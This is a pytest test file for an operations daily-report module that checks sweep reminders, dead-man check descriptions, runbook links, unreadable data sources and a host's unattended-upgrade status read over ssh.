    `preamble=True`'s row sits above the FIRST heading -- pass it with no rows, or they outvote it."""
    text = [
        "# Kraken reference-data snapshot register",
        "",
        *(["| #8 (above every heading) | 2098-01-01T00:00:00+00:00 | x |", ""] if preamble else []),
        "## Provenance",
        "",
        "| Sweep | Fetched at (UTC) |",
        "| -- | -- |",
        "",
        "## Re-confirmation log",
        "",
        "Prose before the table, with a date in it: 2031-01-01.",
        "",
        "| Sweep | Fetched at (UTC) | Full response |",
        "| -- | -- | -- |",
        *[f"| {first} | {fetched} | 1429 pairs / 824 assets |" for first, fetched in rows],
        "| not a sweep row | 2000-01-01T00:00:00+00:00 | x |",
        "",
    ]
    if decoy:
        text += ["## Deferred: account-gated facts", "", "| #9 (decoy) | 2099-01-01T00:00:00+00:00 | x |", ""]
    path = tmp_path / "register.md"
    path.write_text("\n".join(text))
    return path


def test_the_last_sweep_date_is_read_from_the_real_register_not_a_fixture_shaped_to_the_parser():
    """`last_sweep_date` returns the committed register's LAST log row -- the bound is `>=` the second
    row's date so it does not rot as sweeps append, and the assertion beside it re-derives the answer
    by slicing the section out by heading, honouring the same boundary by a different mechanism."""
    found = ops_daily.last_sweep_date(ops_daily.REGISTER)
    assert found is not None and found >= date(2026, 8, 4), found
    log = ops_daily.REGISTER.read_text().split("\n## Re-confirmation log\n", 1)[1].split("\n## ", 1)[0]
    rows = [line for line in log.splitlines() if line.startswith("| #")]
    assert found.isoformat() in rows[-1], (found, rows[-1])


def test_the_last_row_of_the_log_wins_and_tables_outside_it_are_ignored(tmp_path):
    register = _register(
        tmp_path, ("#0 (Phase 0, iter-002)", "2026-07-07T03:29:00+00:00"), ("#1 (monthly, 2026-08-04)", "2026-08-04T10:40:09+00:00")
    )
    assert ops_daily.last_sweep_date(register) == date(2026, 8, 4)


def test_a_log_with_no_dated_row_reads_as_none_never_as_a_date_from_elsewhere(tmp_path):
    assert ops_daily.last_sweep_date(_register(tmp_path)) is None
    assert ops_daily.last_sweep_date(_register(tmp_path, decoy=False)) is None
    # Above the FIRST heading, where only the gate's own initializer can reject the row -- the two
    # cases above are decided by a `## ` line reassigning `in_log`, so they pass unchanged if the
    # gate starts open.
    assert ops_daily.last_sweep_date(_register(tmp_path, preamble=True)) is None


@pytest.mark.parametrize(
    "last,expected",
    [
        (date(2026, 8, 4), date(2026, 9, 4)),
        (date(2026, 12, 4), date(2027, 1, 4)),
        (date(2026, 1, 31), date(2026, 2, 28)),
    ],
)
def test_the_monthly_cadence_is_a_calendar_month_with_the_day_clamped(last, expected):
    """The sweep reminders were armed a calendar month apart (2026-08-04 -> 2026-09-04), not 30 days."""
    assert ops_daily._a_month_after(last) == expected


def _counter(value):
    return {"data": {"result": [{"metric": {}, "value": [1, str(value)]}]}}


_TWO_SWEEPS = (("#0 (Phase 0, iter-002)", "2026-07-07T03:29:00+00:00"), ("#1 (monthly, 2026-08-04)", "2026-08-04T10:40:09+00:00"))


def _reminder(read, name):
    (found,) = [r for r in read.reminders if r.name == name]
    return found


@pytest.mark.parametrize(
    "now,status,owed",
    [
        (datetime(2026, 8, 30, 3, 0, tzinfo=timezone.utc), "due in 5 days", False),
        (datetime(2026, 9, 4, 3, 0, tzinfo=timezone.utc), "due in 0 days", True),
        (datetime(2026, 9, 10, 3, 0, tzinfo=timezone.utc), "OVERDUE by 6 days", True),
    ],
)
def test_the_refdata_reminder_is_computed_from_the_register_and_the_monthly_cadence(tmp_path, now, status, owed):
    """A lost Slack message costs nothing: due-ness is derived from repo state every day."""
    read = ops_daily.read_reminders(
        "tok", now=now, window=DAY, opener=_canned(_counter(0)), register=_register(tmp_path, *_TWO_SWEEPS)
    )
    refdata = _reminder(read, "refdata sweep")
    assert refdata.status.startswith(status), refdata.status
    assert "2026-08-04" in refdata.status, refdata.status
    assert refdata.owed is owed
    assert refdata.runbook == "infra/runbooks/reference-data.md#refdata-sweep-due"
    assert read.unreadable is None


def test_a_register_with_no_dated_row_is_an_unreadable_source_never_not_due(tmp_path):
    read = ops_daily.read_reminders("tok", now=NOW, window=DAY, opener=_canned(_counter(0)), register=_register(tmp_path))
    assert read.unreadable and "Re-confirmation log" in read.unreadable, read.unreadable
    assert not [r for r in read.reminders if r.name == "refdata sweep"]


@pytest.mark.parametrize("value,owed,word", [("88.4", True, "moved ~+88.4 s"), ("0", False, "unchanged")])
def test_the_healable_reminder_fires_only_when_the_counter_moved(tmp_path, value, owed, word):
    """The reminder is owed only when the counter moved, and its status names the movement -- two
    payloads here: the `increase()`, then a `resets()` of 0."""
    read = ops_daily.read_reminders(
        "tok", now=NOW, window=DAY, opener=_canned(_counter(value), _counter(0)), register=_register(tmp_path, *_TWO_SWEEPS)
    )
    healable = _reminder(read, "healable re-derivation")
    assert healable.owed is owed
    assert word in healable.status, healable.status
    assert healable.runbook == "infra/runbooks/ops.md#healable-threshold-rederivation-due"


def test_the_healable_reminder_names_a_counter_reset_and_never_quotes_it_as_movement(tmp_path):
    """A non-zero `resets()` in the window makes the paired `increase()` unquotable: the reminder is
    owed, its status names the reset, and the figure `increase()` returned never reaches the report
    as movement."""
    read = ops_daily.read_reminders(
        "tok", now=NOW, window=DAY, opener=_canned(_counter("18850.2"), _counter(1)), register=_register(tmp_path, *_TWO_SWEEPS)
    )
    healable = _reminder(read, "healable re-derivation")
    assert healable.owed is True
    assert "reset" in healable.status and "18850" not in healable.status, healable.status


def test_a_healable_counter_with_no_series_is_unreadable_never_quiet(tmp_path):
    read = ops_daily.read_reminders(
        "tok", now=NOW, window=DAY, opener=_canned({"data": {"result": []}}), register=_register(tmp_path, *_TWO_SWEEPS)
    )
    assert read.unreadable and "no series" in read.unreadable, read.unreadable
    assert not [r for r in read.reminders if r.name == "healable re-derivation"]
    assert _reminder(read, "refdata sweep")  # the half that could be read still is


def test_the_real_register_yields_a_refdata_reminder():
    """The committed `REGISTER` default is what this exercises: it omits `register=` deliberately, so
    giving it a `tmp_path` fixture would move it off the path `main` takes."""
    read = ops_daily.read_reminders("tok", now=NOW, window=DAY, opener=_canned(_counter(0)))
    assert read.unreadable is None, read.unreadable
    assert {r.name for r in read.reminders} == {"refdata sweep", "healable re-derivation"}


def test_every_runbook_citation_the_instrument_itself_prints_resolves():
    """Every `infra/runbooks/<file>#<anchor>` the instrument prints reaches a paged operator verbatim,
    and a rename of a cited section -- spec 00107 D6 rewrote both -- would leave this module's copy
    rotting silently, so the guard scans the module's source rather than pinning the constants."""
    cited = set(re.findall(r"infra/runbooks/([A-Za-z0-9._-]+\.md)#([A-Za-z0-9_-]+)", _SCRIPT.read_text()))
    assert cited, "no runbook citation found in the instrument -- this guard has gone vacuous, not clean"
    anchors = {f"{p.name}#{a}" for p in _RUNBOOKS.glob("*.md") for a in re.findall(r'<a name="([^"]+)"></a>', p.read_text())}
    assert {f"{f}#{a}" for f, a in cited} <= anchors, sorted({f"{f}#{a}" for f, a in cited} - anchors)


# --- spec 00107 D2: the reminders reach the report and the paragraph ----------------------------------------


def test_an_owed_reminder_reports_and_never_blocks():
    """Spec 00107 D2: the reminder is a finding in the report, not an exit code -- a calendar date
    passing is not a fleet defect. It reaches the markdown AND the journal paragraph, because the
    paragraph is what gets pasted."""
    owed = ops_daily.RemindersRead(
        reminders=[
            ops_daily.Reminder(
                "refdata sweep",
                "OVERDUE by 6 days (last sweep 2026-08-04)",
                owed=True,
                runbook="infra/runbooks/reference-data.md#refdata-sweep-due",
            ),
            ops_daily.Reminder(
                "healable re-derivation",
                "counter unchanged in 24 h",
                owed=False,
                runbook="infra/runbooks/ops.md#healable-threshold-rederivation-due",
            ),
        ]
    )
    r = _report(reminders=owed)
    assert r.exit_code == 0, r.exit_code
    md = r.markdown()
    assert "## Reminders" in md and "OWED refdata sweep: OVERDUE by 6 days" in md and "#refdata-sweep-due" in md, md
    assert "ok healable re-derivation: counter unchanged" in md, md
    para = r.journal_paragraph()
    assert "reminders OWED refdata sweep: OVERDUE by 6 days" in para, para
    assert "OWED healable" not in para, para  # the marker discriminates; it is not decoration


def test_an_unreadable_reminder_source_exits_2_like_every_other_source():
    r = _report(reminders=ops_daily.RemindersRead(unreadable="the healable counter could not be read: timed out"))
    assert r.exit_code == 2 and "healable counter could not be read" in r.markdown()


def test_the_report_refuses_to_be_built_without_a_reminders_read():
    """A default that reads as 'nothing due' is the silent gap this iteration closes, so `build_report`
    carries no default for `reminders`: omitting it raises rather than reporting an unread source as
    clean. `Report.reminders` gaining a default later would not be caught here -- this pins the call."""
    with pytest.raises(TypeError):
        ops_daily.build_report(
            alerts=ops_daily.AlertsRead(),
            logs=ops_daily.LogsRead(),
            deadmen=ops_daily.DeadmenRead(),
            verdict=[],
            deploys=[],
            now=NOW,
        )


# --- spec 00107 D5: the dead-man descriptions are checked, not generated ---------------------------------------

_GOOD_LINK = "infra/runbooks/ops-node.md#zcrypto-ops-archive-pull-stalled"
_CLEAN_DESC = f"Pings on a clean overlay-writer cycle. Runbook: {_GOOD_LINK}"


def test_a_description_carrying_an_internal_token_is_a_finding_named_per_check():
    """`operator-facing-text.md` governs these descriptions, read from a phone with nothing open and
    hand-written in a SaaS: every banned token in one description is its own finding, named per
    check, and a clean description yields none."""
    checks = [
        {
            "name": "zcrypto-engine-shadow",
            "desc": "Phase-6 shadow engine, spec 00050. Runbook: infra/runbooks/engine.md#zcrypto-engine-cycle-stale",
        },
        {
            "name": "zcrypto-gate-verify",
            "desc": "Gate export, see T0083 and iter-120. Runbook: infra/runbooks/gate.md#zcrypto-gate-exporter-stale",
        },
        {"name": "clean", "desc": _CLEAN_DESC},
    ]
    findings = ops_daily.check_descriptions(checks)
    engine = [f for f in findings if f.startswith("`zcrypto-engine-shadow`")]
    assert {t for f in engine for t in ("Phase-6", "spec 00050") if repr(t) in f} == {"Phase-6", "spec 00050"}, findings
    gate = [f for f in findings if f.startswith("`zcrypto-gate-verify`")]
    assert {t for f in gate for t in ("T0083", "iter-120") if repr(t) in f} == {"T0083", "iter-120"}, findings
    assert not [f for f in findings if f.startswith("`clean`")], findings
    assert len(findings) == 4, findings


def test_a_missing_or_dangling_runbook_link_is_a_finding():
    """A finding is raised unless a `Runbook: ` prefix introduces a link whose anchor lives in the
    file it names -- it is the prefixed link that is judged, so a resolving mention ahead of a dead
    one does not rescue it."""
    checks = [
        {"name": "dangling", "desc": "Runbook: infra/runbooks/ops.md#no-such-anchor"},
        {"name": "wrong-file", "desc": "Runbook: infra/runbooks/capture.md#zcrypto-ops-archive-pull-stalled"},
        {"name": "linkless", "desc": "Pings every minute."},
        {"name": "prefixless", "desc": "Context in infra/runbooks/ops-node.md#zcrypto-ops-archive-pull-stalled, no link."},
        {
            "name": "passing-mention-first",
            "desc": "Context in infra/runbooks/ops-node.md#zcrypto-ops-archive-pull-stalled. Runbook: infra/runbooks/ops.md#no-such-anchor",
        },
        {"name": "clean", "desc": _CLEAN_DESC},
    ]
    findings = ops_daily.check_descriptions(checks)
    expected = ["`dangling`", "`linkless`", "`passing-mention-first`", "`prefixless`", "`wrong-file`"]
    assert sorted(f.split(":")[0] for f in findings) == expected, findings


def test_a_check_with_no_description_at_all_is_a_finding_not_a_pass():
    assert ops_daily.check_descriptions([{"name": "bare"}]) == [
        "`bare`: no `Runbook: infra/runbooks/<file>#<anchor>` in its description"
    ]


def test_a_working_link_is_not_a_finding_for_how_its_prefix_was_typed():
    """The prefix marks a citation, not a format: it is the loose half of the match while the
    `infra/runbooks/` path stays exact, because this check detects and cannot repair -- a finding
    against a link that works costs a line in every daily report until a human edits it."""
    checks = [
        {"name": "exact", "desc": f"Runbook: {_GOOD_LINK}"},
        {"name": "lower", "desc": f"runbook: {_GOOD_LINK}"},
        {"name": "nospace", "desc": f"Runbook:{_GOOD_LINK}"},
        {"name": "twospace", "desc": f"Runbook:  {_GOOD_LINK}"},
        {"name": "newline", "desc": f"Runbook:\n{_GOOD_LINK}"},
    ]
    assert ops_daily.check_descriptions(checks) == []


def test_every_prefixed_link_is_judged_not_only_the_first():
    """One citation resolving says nothing about the next: a description whose SECOND link is dead
    still sends the operator to a fragment that scrolls nowhere, and the finding names that link."""
    checks = [{"name": "second-dead", "desc": f"Runbook: {_GOOD_LINK} and Runbook: infra/runbooks/ops.md#no-such-anchor"}]
    assert ops_daily.check_descriptions(checks) == [
        "`second-dead`: its runbook link infra/runbooks/ops.md#no-such-anchor resolves to no anchor"
    ]


def test_the_deadmen_read_checks_the_descriptions_it_fetched(monkeypatch):
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "hcr_fake")
    prom = {"data": {"result": [{"metric": {}, "value": [1, "0"]}]}}
    direct = {
        "checks": [
            {
                "name": "zcrypto-engine-shadow",
                "desc": "T0083 retagged. Runbook: infra/runbooks/engine.md#zcrypto-engine-cycle-stale",
            },
            {"name": "zcrypto-gate-verify", "desc": _CLEAN_DESC},
        ]
    }
    read = ops_daily.read_deadmen("tok", opener=_canned(prom, direct))
    assert read.unreadable is None
    assert read.description_findings == ["`zcrypto-engine-shadow`: its description carries the internal token 'T0083'"], (
        read.description_findings
    )


def test_a_runbook_read_failure_during_the_descriptions_check_is_named_as_such_not_as_healthchecks(monkeypatch):
    """A runbook read that fails is a finding about the RUNBOOKS, the checks it fetched stay read, and
    `description_findings` stays `None` -- a check that never ran must not print as one that ran and
    found nothing."""
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "hcr_fake")
    monkeypatch.setattr(ops_daily, "check_descriptions", lambda checks: (_ for _ in ()).throw(OSError("runbooks unreadable")))
    prom = {"data": {"result": [{"metric": {}, "value": [1, "0"]}]}}
    read = ops_daily.read_deadmen("tok", opener=_canned(prom, {"checks": [{"name": "x", "desc": _CLEAN_DESC}]}))
    assert len(read.via_healthchecks) == 1 and read.description_findings is None, read.description_findings
    assert read.unreadable and "runbooks" in read.unreadable and "healthchecks.io" not in read.unreadable, read.unreadable
    markdown = _report(deadmen=read).markdown()
    assert "descriptions: all" not in markdown, markdown


def test_a_description_finding_reaches_the_report_and_the_paragraph_and_never_blocks():
    """Spec 00107 D5: a description finding is a report line and a journal clause, never the exit
    code -- a hand-written SaaS field no repo change touches would otherwise hold the pass at
    `attention` every day."""
    deadmen = ops_daily.DeadmenRead(
        via_prometheus=0.0,
        via_healthchecks=[{"name": "x"}],
        description_findings=["`x`: its description carries the internal token 'T0083'"],
    )
    r = _report(deadmen=deadmen)
    assert r.exit_code == 0, r.exit_code
    md = r.markdown()
    assert "- description: `x`: its description carries the internal token 'T0083'" in md, md
    assert "**Verdict: all-clear** (exit 0)" in md, md
    assert "- descriptions: all" not in md, md  # the finding line and the all-clear line are exclusive
    assert "1 description finding" in r.journal_paragraph(), r.journal_paragraph()


def test_clean_descriptions_say_so_in_the_report_and_stay_out_of_the_paragraph():
    """`description_findings=[]` is the CHECKED-and-clean state, and the only one that may print the
    all-clear line -- the default `None` means the check did not run."""
    r = _report(
        deadmen=ops_daily.DeadmenRead(via_prometheus=0.0, via_healthchecks=[{"name": "a"}, {"name": "b"}], description_findings=[])
    )
    assert r.exit_code == 0
    assert "- descriptions: all 2 carry a resolving runbook link and no internal token" in r.markdown(), r.markdown()
    assert "description finding" not in r.journal_paragraph()


def test_todays_ten_real_descriptions_all_pass():
    """The true positive: a check that refuses everything is not a check. The fixture is
    `name`/`tags`/`desc` only, fetched through the read-only key -- never the whole object, which
    carries each check's write URL -- so a description rewritten in the SaaS moves nothing here until
    it is re-fetched."""
    checks = json.loads((Path(__file__).resolve().parent / "fixtures" / "healthchecks_descriptions.json").read_text())
    assert len(checks) == 10, len(checks)
    assert ops_daily.check_descriptions(checks) == []


# --- T0168: the claims the pass rests on that nothing asserted -------------------------------------------------


def _dies_mid_read():
    """An opener whose 200 fails while its BODY is read, rather than at open like every other fixture."""

    class _TruncatedBody:
        def read(self, *args):
            raise http.client.IncompleteRead(b"")

    @contextlib.contextmanager
    def opener(request, timeout=None):
        yield _TruncatedBody()

    return opener


@pytest.mark.parametrize(
    ("reader", "source"),
    [
        ("read_alerts", "the rules API"),
        ("read_logs", "the log plane"),
        ("read_deadmen", "the dead-man count"),
        ("read_reminders", "the healable counter"),
    ],
)
def test_a_body_that_dies_mid_read_is_an_unreadable_source_on_every_reader(reader, source, tmp_path, monkeypatch):
    """Each reader reports a truncated body as ITS OWN unreadable source instead of raising -- the read
    side of `_UNREACHABLE`, which every fixture that fails at open leaves unexercised."""
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "k")
    extra = {
        "read_alerts": {"now": NOW, "window": DAY},
        "read_logs": {"window": DAY},
        "read_deadmen": {},
        "read_reminders": {"now": NOW, "window": DAY, "register": _register(tmp_path, *_TWO_SWEEPS)},
    }[reader]
    read = getattr(ops_daily, reader)("tok", opener=_dies_mid_read(), **extra)
    assert read.unreadable is not None, f"{reader} read a body that died mid-read as a clean source"
    assert source in read.unreadable, read.unreadable


def test_the_reminders_field_of_the_report_carries_no_default():
    """`Report.reminders` carries neither default, so no caller can build a Report whose reminders
    source was never read and which reports nothing due."""
    (reminders,) = [f for f in dataclasses.fields(ops_daily.Report) if f.name == "reminders"]
    assert reminders.default is dataclasses.MISSING, reminders.default
    assert reminders.default_factory is dataclasses.MISSING, reminders.default_factory


# Counted from the committed script as OCCURRENCES of the interpolation, never as lines carrying it:
# two endpoints on one line is an ordinary edit, and the binding on its own line carries no `{...}`.
_GRAFANA_URL_SITES = 3


def test_every_site_that_builds_a_grafana_url_is_pinned():
    """The instrument's source carries the literal `{GRAFANA_URL}` exactly `_GRAFANA_URL_SITES` times,
    so an endpoint added or dropped reds."""
    lines = [line.strip() for line in _SCRIPT.read_text().splitlines() if line.count("{GRAFANA_URL}")]
    sites = sum(line.count("{GRAFANA_URL}") for line in lines)
    assert sites == _GRAFANA_URL_SITES, (
        f"{sites} sites build a URL from GRAFANA_URL, pinned at {_GRAFANA_URL_SITES} -- pin the new one in "
        "`test_every_endpoint_the_instrument_builds_is_pinned` and raise `_GRAFANA_URL_SITES`:\n" + "\n".join(lines)
    )


# grep takes its pattern from somewhere other than operand 0 through these options and no others --
# its own closed set, `-e`/`--regexp` naming the pattern and `-f`/`--file` a file holding it. Each is
# probed alone, a long one with its value attached, and a short one inside a two-letter cluster.
_GREP_PATTERN_SOURCES = ("-e", "--regexp", "-f", "--file")
_GREP_PATTERN_SOURCE_TOKENS = [
    token
    for source in _GREP_PATTERN_SOURCES
    for token in (
        [source, f"{source}=X"]
        if source.startswith("--")
        else [source, *(f"-{source[1]}{c}" for c in string.ascii_letters), *(f"-{c}{source[1]}" for c in string.ascii_letters)]
    )
]


def _shape_admits_flag(shape, token: str) -> bool:
    """Whether `_match_shape` would consume `token` as a flag of `shape` rather than as an operand."""
    return token.partition("=")[0] in shape.flags or bool(shape.short and re.fullmatch(shape.short, token))


def test_no_grep_shape_admits_a_pattern_source_option():
    """`_reads_only_safe_paths` skips grep's operand 0 as its pattern: in every table discovered off
    the module, no grep shape admits a probed spelling of grep's pattern-source options."""
    tables = sorted(name for name in vars(ops_daily) if name.endswith("_SHAPES"))
    assert tables, "no shape table discovered -- the sweep, not the classifier, is what failed"
    greps = [(name, shape) for name in tables for shape in getattr(ops_daily, name) if shape.head == ("grep",)]
    assert greps, f"no grep shape discovered in {tables} -- the sweep, not the classifier, is what failed"
    admitted = [(name, token) for name, shape in greps for token in _GREP_PATTERN_SOURCE_TOKENS if _shape_admits_flag(shape, token)]
    assert not admitted, (
        f"grep shapes admitting a pattern-source option: {admitted} -- such an option takes the pattern, "
        "leaving a FILE at the operand `_reads_only_safe_paths` skips"
    )


_ALERTS = Path(__file__).resolve().parents[1] / "infra/grafana/alerts.yaml"
_METRIC = re.compile(r"zcrypto_[a-z_]+")


def _rules_reading(metric: str, rules: list[dict]) -> list[dict]:
    return [r for r in rules if any(metric in (q.get("model") or {}).get("expr", "") for q in r.get("data", []))]


def test_each_bounded_verdict_check_agrees_with_the_rule_it_mirrors():
    """A bounded check and its owning rule agree at every value probed from zero to just past the
    threshold, which is read out of `alerts.yaml` on both sides rather than restated here."""
    rules = yaml.safe_load(_ALERTS.read_text())["rules"]
    # The checks that mirror a threshold rule: bounded AND naming one metric. The `up` pair is bounded
    # and names none, so a rule cannot be found for it and it is not one of these.
    mirrored = [(n, e, b) for n, e, b in ops_daily.VERDICT_CHECKS if b is not None and len(set(_METRIC.findall(e))) == 1]
    assert [n for n, _, _ in mirrored] == ["engine cycle age", "reconcile source lag", "logship drops"], mirrored

    disagreements = []
    for name, expr, bound in mirrored:
        (metric,) = set(_METRIC.findall(expr))
        owning = _rules_reading(metric, rules)
        assert len(owning) == 1, f"{name}: {metric} is read by {[r['uid'] for r in owning]}, so no single rule owns it"
        (rule,) = owning
        (node,) = [d for d in rule["data"] if d["refId"] == rule["condition"]]
        (condition,) = node["model"]["conditions"]
        # The complement below reads `gt` as "healthy at or below"; another evaluator would invert it.
        assert condition["evaluator"]["type"] == "gt", f"{name}: {rule['uid']} evaluates {condition['evaluator']}"
        (threshold,) = condition["evaluator"]["params"]
        # Across the interval the rule leaves quiet, not at its edge alone: a bound narrowed from
        # BELOW -- `1000 <= v <= 16500` -- agrees at the threshold and above it while failing every
        # freshly completed cycle, which the pass would report as a FAIL on a healthy fleet.
        for probe in sorted({float(threshold) * i / 8 for i in range(9)} | {float(threshold) + 1}):
            fires = probe > threshold
            if bound(probe) != (not fires):
                disagreements.append(f"{name} vs {rule['uid']} at {probe}: check ok={bound(probe)}, rule fires={fires}")
    assert not disagreements, disagreements


def test_the_healthchecks_fixture_carries_no_key_the_read_only_fetch_never_returns():
    """The fixture's keys stay inside the trio the read-only key returns, so it cannot vouch for a
    payload shape production never sends."""
    fixture = Path(__file__).resolve().parent / "fixtures" / "healthchecks_descriptions.json"
    extra = sorted({key for check in json.loads(fixture.read_text()) for key in check} - {"name", "tags", "desc"})
    assert not extra, f"the fixture grew {extra}, which the read-only fetch does not return"


# --- T0168 item F: a failed unattended upgrade on the host holding the live trade key -------------------------


# What `zcrypto-main` measured on host `zcrypto` on 2026-09-06, transcribed rather than invented --
# systemd's human timestamp form included, which is the form the parser has to read. The values drift
# with the next patch, so what is pinned here is their SHAPE, and the clock is the measurement's own
# rather than the real one.
_MEASURED_RAN = "Sun 2026-09-06 06:38:58 UTC"
_MEASURED_STAMP = datetime(2026, 9, 6, 6, 38, 58, tzinfo=timezone.utc)
_UPGRADE_NOW = datetime(2026, 9, 6, 12, 0, tzinfo=timezone.utc)


def _host_answering(**overrides):
    """A runner answering ONE command with the host's `key=value` lines.

    Each mode overrides a different field, so no two modes get the same reply.
    """
    answer = {
        "Result": "success",
        "ExecMainStatus": "0",
        "ExecMainExitTimestamp": _MEASURED_RAN,
        "StampEpoch": str(int(_MEASURED_STAMP.timestamp())),
        "RebootRequired": "",
        "RebootPkgs": "",
        **overrides,
    }
    calls = []

    def runner(command):
        calls.append(command)
        return "".join(f"{key}={value}\n" for key, value in answer.items())

    runner.calls = calls
    return runner


def _upgrade(runner):
    return ops_daily.read_unattended_upgrades(now=_UPGRADE_NOW, runner=runner)


def test_the_measured_host_reading_passes_and_costs_exactly_one_ssh():
    """The true positive: the reading main took off `zcrypto` passes, names when the upgrade ran, and
    reaches the host once -- the four upgrade values and the reboot read travel in the same command."""
    runner = _host_answering()
    check = _upgrade(runner)
    assert check.ok is True, check.value
    assert _report(verdict=[check]).exit_code == 0
    assert "last run 2026-09-06T06:38:58Z" in check.value, check.value
    assert "reboot" not in check.value, check.value
    assert runner.calls == [ops_daily.UPGRADE_COMMAND], runner.calls


def test_the_ssh_the_check_runs_fails_a_prompt_rather_than_waiting_on_one():
    """Spelt out rather than compared against `UPGRADE_COMMAND`, which a dropped flag would carry with
    it: without the flag this ssh waits on inherited stdin for a prompt until the pass times out."""
    runner = _host_answering()
    _upgrade(runner)
    (argv,) = runner.calls
    assert argv[:3] == ("ssh", "-o", "BatchMode=yes"), argv


@pytest.mark.parametrize("result", ["exit-code", "timeout", "signal"])
def test_a_result_other_than_success_is_attention(result):
    """`Result` is read as a value, not as a presence: any non-`success` word systemd records fails."""
    check = _upgrade(_host_answering(Result=result))
    assert check.ok is False, check.value
    assert _report(verdict=[check]).exit_code == 1


def test_a_non_zero_exec_status_fails_even_beside_a_result_that_reads_success():
    """Both fields are read, never one: a check resting on `Result` alone passes a run whose recorded
    exit status is non-zero."""
    check = _upgrade(_host_answering(ExecMainStatus="1"))
    assert check.ok is False, check.value
    assert "Result=success" in check.value, check.value
    assert _report(verdict=[check]).exit_code == 1


def test_a_stamp_older_than_the_bound_fails_where_the_unit_fields_still_read_healthy():
    """A timer that stopped firing leaves `Result` and `ExecMainStatus` frozen at their last healthy
    values, so the stamp's age is the only reading that catches it -- and it is the one that reads."""
    stale = _UPGRADE_NOW - (ops_daily.UPGRADE_STALE_AFTER + timedelta(hours=1))
    check = _upgrade(_host_answering(StampEpoch=str(int(stale.timestamp()))))
    assert check.ok is False, check.value
    assert "Result=success, ExecMainStatus=0" in check.value, check.value
    assert _report(verdict=[check]).exit_code == 1


@pytest.mark.parametrize(("past_bound", "ok"), [(-timedelta(minutes=1), True), (timedelta(minutes=1), False)])
def test_the_staleness_bound_is_two_days_on_both_of_its_sides(past_bound, ok):
    """A minute inside two days passes and a minute outside fails. Two days is the decided value, not
    a value read back out of the code: the stamps under `/var/lib/apt/periodic/` were measured about
    a day apart, so a bound narrowed to one would report that normal spread as a stopped timer."""
    stamp = _UPGRADE_NOW - (timedelta(days=2) + past_bound)
    check = _upgrade(_host_answering(StampEpoch=str(int(stamp.timestamp()))))
    assert check.ok is ok, check.value


# Spelt out rather than read from `UPGRADE_STAMP`, which a swap would carry with it -- the same
# reason the bound above is the literal `timedelta(days=2)`.
_UPGRADE_STAMP = "/var/lib/apt/periodic/unattended-upgrades-stamp"


def test_the_staleness_arm_reads_the_stamp_the_upgrade_itself_writes():
    """`update-stamp` in the same directory is touched by the download half on days no upgrade ran, so
    an arm pointed there would read fresh on exactly the stopped-timer host it exists to catch."""
    assert ops_daily.UPGRADE_STAMP == _UPGRADE_STAMP, ops_daily.UPGRADE_STAMP
    assert f"stat -c %Y {_UPGRADE_STAMP} " in ops_daily.UPGRADE_COMMAND[-1], ops_daily.UPGRADE_COMMAND


def test_a_unit_that_never_ran_is_unreadable_rather_than_the_pass_its_two_fields_alone_would_give():
    """`Result=success` and `ExecMainStatus=0` are what systemd reports for a unit that has NEVER run,
    with `ExecMainExitTimestamp` empty -- so the timestamp is parsed rather than merely printed, and
    those two fields alone cannot pass a host whose upgrade has never happened."""
    check = _upgrade(_host_answering(ExecMainExitTimestamp=""))
    assert check.value.startswith("unreadable: "), check.value
    assert _report(verdict=[check]).exit_code == 2


@pytest.mark.parametrize(
    "failure",
    [subprocess.CalledProcessError(255, "ssh"), subprocess.TimeoutExpired("ssh", 30), OSError("ssh: no route to host")],
    ids=["non-zero ssh", "timeout", "unreachable"],
)
def test_a_host_the_pass_could_not_reach_is_unreadable_never_a_failed_patch(failure):
    """Every way the live runner can fail is exit 2, the code for a source that could not be read: a
    FAIL here would blame the host's patching for a dropped connection."""

    def runner(command):
        raise failure

    check = ops_daily.read_unattended_upgrades(now=_UPGRADE_NOW, runner=runner)
    assert check.value.startswith("unreadable: "), check.value
    assert _report(verdict=[check]).exit_code == 2


def test_a_pending_reboot_names_its_packages_and_moves_no_verdict():
    """`node_reboot_required` already carries the flag; this line carries the WHY an operator picking
    an attended window wants. A pending reboot is not a failed upgrade, so `ok` and the exit code are
    the ones a host with no flag gets -- conflated, the check would read attention every day between a
    kernel patch and its window and bury the failed patch it exists to surface."""
    check = _upgrade(_host_answering(RebootRequired="yes", RebootPkgs="linux-image-6.1.0-40-amd64 linux-base "))
    assert "reboot pending: linux-image-6.1.0-40-amd64 linux-base" in check.value, check.value
    # The exit code first, because it is the surface the conflation would move: a pass reading
    # attention is what an operator sees, and `ok` is only how it got there.
    assert _report(verdict=[check]).exit_code == 0, check.value
    assert check.ok is True, check.value


def test_a_flag_without_its_package_list_is_a_reported_state_never_an_error():
    """A missing `.pkgs` beside a set flag is reported as the state it is, not as an unreadable source
    and not as a failure."""
    check = _upgrade(_host_answering(RebootRequired="yes"))
    assert "reboot pending: flag set, packages unknown" in check.value, check.value
    assert not check.value.startswith("unreadable: "), check.value
    assert _report(verdict=[check]).exit_code == 0, check.value
    assert check.ok is True, check.value


def test_the_runner_is_keyword_only_and_carries_no_live_default():
    """No default a test can take silently: one that forgets its runner fails instead of reaching the
    live host."""
    runner = inspect.signature(ops_daily.read_unattended_upgrades).parameters["runner"]
    assert runner.kind is inspect.Parameter.KEYWORD_ONLY, runner.kind
    assert runner.default is inspect.Parameter.empty, runner.default
    with pytest.raises(TypeError):
        ops_daily.read_unattended_upgrades(now=_UPGRADE_NOW)


def test_the_upgrade_check_reaches_the_verdict_the_pass_prints(monkeypatch, capsys):
    """The reader is wired into the report `main` prints: a check nothing appends reports nothing."""
    monkeypatch.setattr(ops_daily.grafana_auth, "vault_var", lambda name: "tok")
    monkeypatch.setattr(ops_daily, "read_alerts", lambda *a, **k: ops_daily.AlertsRead())
    monkeypatch.setattr(ops_daily, "read_logs", lambda *a, **k: ops_daily.LogsRead())
    monkeypatch.setattr(ops_daily, "read_deadmen", lambda *a, **k: ops_daily.DeadmenRead(via_prometheus=0.0))
    monkeypatch.setattr(ops_daily, "read_verdict", lambda *a, **k: [])
    monkeypatch.setattr(ops_daily, "read_deploys", lambda *a, **k: [])
    monkeypatch.setattr(ops_daily, "read_reminders", lambda *a, **k: ops_daily.RemindersRead())
    # `main` reads the real clock, so the stamp is answered against it: pinned to the measurement's
    # date this assertion would flip from PASS to FAIL two days after that date and stay there.
    fresh = _host_answering(StampEpoch=str(int(datetime.now(timezone.utc).timestamp())))
